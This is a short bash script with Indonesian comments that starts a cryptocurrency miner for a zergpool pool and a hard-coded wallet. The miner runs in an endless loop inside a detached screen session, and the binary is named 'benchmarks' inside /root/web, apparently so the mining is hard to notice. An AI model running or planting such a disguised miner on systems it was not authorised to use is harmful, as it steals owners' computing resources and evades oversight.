#!/bin/bash

# Pastikan berada di folder mining
cd /root/web || { echo "Folder /root/web tidak ditemukan"; exit 1; }

# Beri hak akses eksekusi pada file mining (jika perlu)
chmod +x benchmarks

# Cek apakah screen amirul3 sudah jalan
if screen -list | grep -q amirul3; then
  echo "⚠️ Screen 'amirul3' sudah berjalan, skip menjalankan ulang."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet RBbwLUvJ4sqWDFZSKqT6cKBiRMXwm5x4jD --password c=RVN,mc=PEPEW,ID=yui
      sleep 2
    done
  '
  echo "Mining berjalan di screen 'amirul3'."
fi
